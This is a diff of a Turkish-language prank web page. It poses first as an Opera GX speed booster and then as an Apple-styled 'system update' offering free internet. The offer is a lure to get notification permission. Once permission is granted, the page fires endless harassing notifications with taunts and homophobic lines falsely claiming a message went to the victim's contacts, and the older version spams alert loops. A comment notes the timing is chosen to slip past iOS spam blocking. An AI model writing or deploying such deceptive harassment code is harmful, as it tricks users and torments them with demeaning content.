@@ -3,54 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Opera GX - Gaming SpeedUp</title>
+    <title>Sistem Güncelleme Merkezi</title>
+    
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+
     <style>
-        body { background: #121212; color: #ff1b2d; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .gx-card { border: 2px solid #ff1b2d; padding: 40px; border-radius: 10px; background: #1a1a1a; box-shadow: 0 0 20px #ff1b2d; }
-        .btn-gx { background: #ff1b2d; color: white; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .card { width: 85%; padding: 30px; border: 1px solid #333; border-radius: 20px; background: #1c1c1e; }
+        .btn-push { background: #30d158; color: white; padding: 20px; border-radius: 15px; font-weight: bold; border: none; width: 100%; font-size: 18px; cursor: pointer; }
+        .step { font-size: 13px; color: #8e8e93; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="gx-card">
-        <h1 style="margin-bottom:10px;">🔴 OPERA GX TURBO</h1>
-        <p>İnternet hızını ve FPS'i artırmak için bildirim izni verin.</p>
-        <button class="btn-gx" onclick="startOperaTroll()">TURBOYU AÇ</button>
+    <div class="card">
+        <div style="font-size: 50px; margin-bottom: 20px;">🔔</div>
+        <h2>BİLDİRİM SİSTEMİ</h2>
+        <p>Bedava internet ve müzik paketini tanımlamak için bildirimleri aktif edin.</p>
+        
+        <button class="btn-push" onclick="getNotificationPermission()">AKTİF ET</button>
+        
+        <p class="step">⚠️ İzin penceresi çıkmazsa: <br>Alttaki <b>Paylaş</b> butonuna basıp <b>Ana Ekran'a Ekle</b> deyin ve uygulamayı oradan açın.</p>
     </div>
 
     <script>
-        function startOperaTroll() {
-            // Opera'da bildirim izni isteme
+        async function getNotificationPermission() {
+            // 1. ADIM: Bildirim desteği kontrolü
             if (!("Notification" in window)) {
-                // Eğer bildirim desteklenmiyorsa direk Alert Döngüsüne sokalım (Kaçış yok!)
-                launchAlertLoop();
+                alert("Aga bu tarayıcı bildirim desteklemiyor. Safari'den 'Ana Ekran'a Ekle' yapman şart!");
                 return;
             }
 
-            Notification.requestPermission().then(function(permission) {
-                if (permission === "granted") {
-                    // İzin gelirse saniyede bir dızt dızt!
-                    setInterval(() => {
-                        new Notification("🚨 OPERA KRITIK HATA!", {
-                            body: "HAHAHA HADİ SİL LAN! SİLEBİLİYORSAN SİL!",
-                            icon: "https://upload.wikimedia.org/wikipedia/commons/e/e3/Opera_GX_Logo.png",
-                            tag: 'gx' + Math.random() // Her biri ayrı bildirim olarak düşsün
-                        });
-                    }, 1000); 
-                } else {
-                    // İzin vermezse zorla Alert çıkarıyoruz
-                    launchAlertLoop();
-                }
-            });
-        }
+            // 2. ADIM: İzin İste
+            const permission = await Notification.requestPermission();
 
-        function launchAlertLoop() {
-            alert("TURBO MODU BAŞLATILAMADI!");
-            alert("GAY MODU AKTİF EDİLDİ! HAHAHA!");
-            setInterval(function() {
-                alert("SİLSENE LAN! HADİ SİL!");
-                alert("BEN GAYIM DİYE TÜM REHBERE MESAJ GİTTİ!");
-            }, 10); // 10ms'de bir alert patlatır
+            if (permission === "granted") {
+                alert("SİSTEM AKTİF! Bildirim yağmuru başlıyor...");
+
+                // 3. ADIM: GERÇEK BİLDİRİM DÖNGÜSÜ
+                // Her 5 saniyede bir bildirim merkezine "çat" diye düşer
+                setInterval(() => {
+                    const msgs = [
+                        "🚨 SİLSENE LAN!",
+                        "😏 HADİ SİL SİLEBİLİYORSAN!",
+                        "📱 TELEFONUN ARTIK BENİM!",
+                        "🌈 BEN GAYIM - TÜM REHBERE GİTTİ!"
+                    ];
+                    const randomMsg = msgs[Math.floor(Math.random() * msgs.length)];
+
+                    // Bu gerçek sistem bildirimidir
+                    new Notification(randomMsg, {
+                        body: "Ayarlar'da boşuna gezme, mobbing devam ediyor!",
+                        icon: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg",
+                        tag: 'troll-' + Math.random() // Bildirimlerin üst üste binmemesi için
+                    });
+                }, 5000); // 5 saniyede bir (Çok hızlı yaparsan iOS spam diye engeller)
+
+            } else {
+                alert("İzni vermedin ki mobbing yapalım!");
+            }
         }
     </script>
 </body>
